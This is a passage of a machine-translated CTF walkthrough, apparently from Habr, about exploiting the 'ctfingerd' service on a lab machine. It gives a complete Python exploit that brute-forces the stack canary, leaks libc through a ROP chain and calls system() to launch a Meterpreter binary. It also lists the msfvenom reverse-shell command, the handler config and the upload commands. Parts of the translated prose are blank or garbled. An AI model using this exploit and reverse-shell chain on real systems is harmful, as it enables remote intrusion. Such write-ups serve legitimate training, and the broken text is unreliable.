inherit;">Search canary is, now the most interesting. </font><font style="vertical-align: inherit;">To bypass all the remaining protection that is used here ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NX</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> + </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASLR</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ), we need ROP gadgets, as well as the addresses of the necessary functions, both in the binary itself and in the library </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">libc.so</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> used by it </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">It is actually needed here mainly for calculating the correct address of the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">system</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> function </font><font style="vertical-align: inherit;">, since </font><font style="vertical-align: inherit;">this function is absent </font><font style="vertical-align: inherit;">in </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ctfingerd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">To calculate the address we need:</font></font><br><br><ol><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">address from the GOT table, any function that is present in </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ctfingerd</font></font></i> </li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the address where this function is located in the used </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">libc.so</font></font></i> </li></ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For example, we will use the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> function </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">We get its address in libc, which we previously downloaded to ourselves via ssh:</font></font><br><br><pre> <code class="bash hljs">$ readelf -s libc.so.6 | grep memset@ 838: 0000000000085620 247 FUNC GLOBAL DEFAULT 12 memset@@GLIBC_2.2.5</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And her address in the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GOT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br><br><pre> <code class="bash hljs">$ objdump -R ctfingerd | grep memset 00000000006014e0 R_X86_64_JUMP_SLOT memset</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Further, the actual </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">‚Äúelite‚Äù</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> function that we will use:</font></font><br><br><pre> <code class="bash hljs">$ readelf -s libc.so.6 | grep system 1337: 0000000000041490 45 FUNC WEAK DEFAULT 12 system@@GLIBC_2.2.5</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We will also need the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">read @ plt</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">write @ plt</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> functions </font><font style="vertical-align: inherit;">from the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ctfingerd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> file </font><font style="vertical-align: inherit;">:</font></font><br><br><pre> <code class="bash hljs">gdb-peda$ p write <span class="hljs-variable"><span class="hljs-variable">$1</span></span> = {&lt;text variable, no debug info&gt;} 0x400920 &lt;write@plt&gt; gdb-peda$ p <span class="hljs-built_in"><span class="hljs-built_in">read</span></span> <span class="hljs-variable"><span class="hljs-variable">$2</span></span> = {&lt;text variable, no debug info&gt;} 0x4009b0 &lt;<span class="hljs-built_in"><span class="hljs-built_in">read</span></span>@plt&gt;</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">With the functions finished, go to the search for ROP gadgets, </font></font><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">then</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> you can see exactly which registers are used by the system functions, we will look at the </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">peda</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , which we have used in previous ratapes more than once:</font></font><br><br><pre> <code class="bash hljs">$ gdb -ex <span class="hljs-string"><span class="hljs-string">"start"</span></span> -q ctfingerd gdb-peda$ ropsearch <span class="hljs-string"><span class="hljs-string">'pop rsi'</span></span> Searching <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ROP gadget: <span class="hljs-string"><span class="hljs-string">'pop rsi'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span>: binary ranges 0x00401011 : (b<span class="hljs-string"><span class="hljs-string">'5e415fc3'</span></span>) pop rsi; pop r15; ret gdb-peda$ ropsearch <span class="hljs-string"><span class="hljs-string">'pop rdi'</span></span> Searching <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ROP gadget: <span class="hljs-string"><span class="hljs-string">'pop rdi'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span>: binary ranges 0x00401013 : (b<span class="hljs-string"><span class="hljs-string">'5fc3'</span></span>) pop rdi; ret</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> And one more thing, we need an address where to write our shellcode in memory, let's see what range is available for us to write: </font></font><br><br><pre> <code class="bash hljs">gdb-peda$ vmmap Start End Perm Name 0x00400000 0x00402000 r-xp /home/remnux/ctfingerd 0x00601000 0x00602000 rw-p /home/remnux/ctfingerd</code> </pre> <br>     ,     2 .  ,   ,     <i>libc</i> : <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment"># Get Socket FD s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) req = s.recv(1024) socketFD = parseSockFD(req) # Make payload payload = canaryOffsetBuf # some trash payload += canary # canary payload += pack("&lt;Q", 0x00) # Owerwrite rbp payload += pack('&lt;Q', pop_rdi) # pop rdi, ret payload += pack('&lt;Q', socketFD) # STDOUT to socket payload += pack("&lt;Q", pop_rsi) # pop rsi payload += pack('&lt;Q', memsetGOT) # Address read in GOT payload += pack("&lt;Q", 0x00) # Owerwrite r15 payload += pack("&lt;Q", writePltOffset) # return to write@plt # Send First Payload s.send(payload) sleep(0.1) req = s.recv(1024) print('[+] Response from server: %s ' % req) s.shutdown(1) s.close() # Calculate addresses req = req.split('\n') memsetAddr = unpack("&lt;Q", req[2][:8]) print('[+] Real address for memset(): %s' % hex(memsetAddr[0])) libcBase = (memsetAddr[0] - libcMemsetOffset) print('[+] Real address for libc: %s' % hex(libcBase)) systemAddr = (libcBase + libcSystemOffset) print('[+] Real address for sysem(): %s' % hex(systemAddr))</span></span></code> </pre> <br>         .            <i>system</i> : <br><br><pre> <code class="python hljs">socketFD += <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-comment"><span class="hljs-comment"># Save shellcode to writable memory payload = canaryOffsetBuf # some trash payload += canary # canary payload += pack("&lt;Q", 0x00) # Owerwrite rbp payload += pack("&lt;Q", pop_rdi) # pop rdi payload += pack("&lt;Q", socketFD) # socket to read from payload += pack("&lt;Q", pop_rsi) # pop rsi payload += pack("&lt;Q", free_space) # location to write to payload += pack("&lt;Q", socketFD) # junk for r15 payload += pack("&lt;Q", readPltOffset) # return to read() # Call system() payload += pack("&lt;Q", pop_rdi) payload += pack("&lt;Q", free_space) payload += pack("&lt;Q", systemAddr) # Send Second Payload s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(payload) sleep(0.1) print('[+] Run reverse shell') cmd = '/tmp/x64mettle\x00' s.send(cmd)</span></span></code> </pre> <br>          : <br><br><div class="spoiler"> <b class="spoiler_title">exploit7979.py</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python2 import socket from time import sleep from struct import pack, unpack port = 7979 host = 'localhost' def getCurrentOffset(min_offset, max_offset): return min_offset + (max_offset - min_offset) // 2 def isCrashed(data): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(data) sleep(0.2) req = s.recv(1024) s.shutdown(1) s.close() if '---' not in req: return True return False def findCanaryOffset(): min_offset = 0 max_offset = 2000 cur_offset = getCurrentOffset(min_offset, max_offset) while (max_offset - min_offset) &gt; 1: print('[*] Max Offset: %s Min Offset: %s' % (max_offset, min_offset)) send_data = 'A' * cur_offset if isCrashed(send_data): max_offset = cur_offset else: min_offset = cur_offset cur_offset = getCurrentOffset(min_offset, max_offset) return min_offset def findCanary(payload): canary = '' for i in range(8): for byte in range(256): char = chr(byte) data = payload + canary + char if not isCrashed(data): canary += char print('[+] Found Canary byte %d: %s' % (i, char.encode('hex'))) break print('[+] Canary found: %s' % (canary.encode('hex'))) return canary def parseSockFD(resp): # resp = 'Socket fd: 7\nUser to query: ' =&gt; # ['Socket fd', ' 7\nUser to query', ' '] =&gt; # [' 7', 'User to query'] =&gt; '7' fd = resp.split(':')[1].split('\n')[0].strip() return int(fd) # Detect Canary min_off = findCanaryOffset() canaryOffsetBuf = 'A' * min_off canary = findCanary(canaryOffsetBuf) # Offsets libcSystemOffset = 0x41490 writePltOffset = 0x400920 pop_rsi = 0x401011 pop_rdi = 0x401013 free_space = 0x6012c0 readPltOffset = 0x4009b0 memsetGOT = 0x6014e0 libcMemsetOffset = 0x85620 # Get Socket FD s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) req = s.recv(1024) socketFD = parseSockFD(req) # Make payload payload = canaryOffsetBuf # some trash payload += canary # canary payload += pack("&lt;Q", 0x00) # Owerwrite rbp payload += pack('&lt;Q', pop_rdi) # pop rdi, ret payload += pack('&lt;Q', socketFD) # STDOUT to socket payload += pack("&lt;Q", pop_rsi) # pop rsi payload += pack('&lt;Q', memsetGOT) # Address read in GOT payload += pack("&lt;Q", 0x00) # Owerwrite r15 payload += pack("&lt;Q", writePltOffset) # return to write@plt # Send First Payload s.send(payload) sleep(0.1) req = s.recv(1024) print('[+] Response from server: %s ' % req) s.shutdown(1) s.close() # Calculate addresses req = req.split('\n') memsetAddr = unpack("&lt;Q", req[2][:8]) print('[+] Real address for memset(): %s' % hex(memsetAddr[0])) libcBase = (memsetAddr[0] - libcMemsetOffset) print('[+] Real address for libc: %s' % hex(libcBase)) systemAddr = (libcBase + libcSystemOffset) print('[+] Real address for sysem(): %s' % hex(systemAddr)) socketFD += 1 # Save shellcode to writable memory payload = canaryOffsetBuf # some trash payload += canary # canary payload += pack("&lt;Q", 0x00) # Owerwrite rbp payload += pack("&lt;Q", pop_rdi) # pop rdi payload += pack("&lt;Q", socketFD) # socket to read from payload += pack("&lt;Q", pop_rsi) # pop rsi payload += pack("&lt;Q", free_space) # location to write to payload += pack("&lt;Q", socketFD) # junk for r15 payload += pack("&lt;Q", readPltOffset) # return to read() # Call system() payload += pack("&lt;Q", pop_rdi) payload += pack("&lt;Q", free_space) payload += pack("&lt;Q", systemAddr) # Send Second Payload s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(payload) sleep(0.1) print('[+] Run reverse shell') cmd = '/tmp/x64mettle\x00' s.send(cmd)</span></span></code> </pre><br></div></div><br>     <i>msfvenom</i> ,   ,     : <br><br><pre> <code class="bash hljs">$ sudo msfvenom -p linux/x64/mettle/reverse_tcp lhost=192.168.1.124 lport=4444 -f elf &gt; ./x64mettle</code> </pre> <br>  And also config for <i>msfconsole</i> : <br><br><pre> <code class="bash hljs">$ cat meterpreter.rc use exploit/multi/handler <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> payload linux/x64/mettle/reverse_tcp <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> lhost 192.168.1.124 <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> lport 4444 run</code> </pre> <br>   ssh      : <br><br><pre> <code class="bash hljs">scp x64mettle bob@192.168.1.190:/tmp/ scp exploit7979.py bob@192.168.1.190:/tmp/ ssh bob@192.168.1.190 <span class="hljs-string"><span class="hljs-string">"chmod 777 /tmp/x64mettle"</span></span> ssh bob@192.168.1.190 <span class="hljs-string"><span class="hljs-string">"chmod +x /tmp/exploit7979.py"</span></span></code> </pre> <br>    <i>Metasploit</i> ,         : <br><br><pre> <code class="bash hljs">bob@baffle:/tmp$ python exploit7979.py [*] Max Offset: 2000 Min Offset: 0 [*] Max Offset: 2000 Min Offset: 1000 [*] Max Offset: 1500 Min Offset: 1000 [*] Max Offset: 1250 Min Offset: 1000 [*] Max Offset: 1125 Min Offset: 1000 [*] Max Offset: 1062 Min Offset: 1000 [*] Max Offset: 1031 Min Offset: 1000 [*] Max Offset: 1015 Min Offset: 1000 [*] Max Offset: 1007 Min Offset: 1000 [*] Max Offset: 1003 Min Offset: 1000 [+] Found Canary byte 0: 00 [+] Found Canary byte 1: 17 [+] Found Canary byte 2: 40 [+] Found Canary byte 3: 48 [+] Found Canary byte 4: 6b [+] Found Canary byte 5: 82 [+] Found Canary byte 6: 0e [+] Found Canary byte 7: 73 [+] Canary found: 001740486b820e73 [+] Response from server: User to query: Checking... Don<span class="hljs-string"><span class="hljs-string">'t know anything about this user. 6     @ "!       P    [+] Real address for memset(): 0x7f109f173620 [+] Real address for libc: 0x7f109f0ee000 [+] Real address for sysem(): 0x7f109f12f490 [+] Run reverse shell</span></span></code> </pre> <br>       <i>Meterpreter</i> ': <br><br><img src="https://habrastorage.org/files/c9e/77c/51e/c9e77c51edbe4cda850ff7e0f040c093.png"><br><br>   ,   . </div><p>Source: <a href="https://habr.com/ru/post/318860/">https://habr.com/ru/post/318860/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../318846/index.html">Installing OpenCV in Windows for Dummies and connecting the library to Code Blocks</a></li>
<li><a href="../318848/index.html">Coding with the withdrawal of information. Part 1, philosophical</a></li>
<li><a href="../318850/index.html">33C3 CTF We exploit LaTeX vulnerability in the pdfmaker task</a></li>
<li><a href="../318856/index.html">Data integrity in spite of everything. Disaster Backup in the Azure Pack Infrastructure Cloud</a></li>
<li><a href="../318858/index.html">Enable TLS / SRTP encryption in 3CX</a></li>
<li><a href="../318862/index.html">Building Mobile Applications with Ember</a></li>
<li><a href="../318864/index.html">How to evaluate your publication?</a></li>
<li><a href="../318866/index.html">Docker swarm mode (swarm mode)</a></li>
<li><a href="../318868/index.html">Virtual Reality 2016 Market Analysis</a></li>
<li><a href="../318870/index.html">"Kazakov" no secrets</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>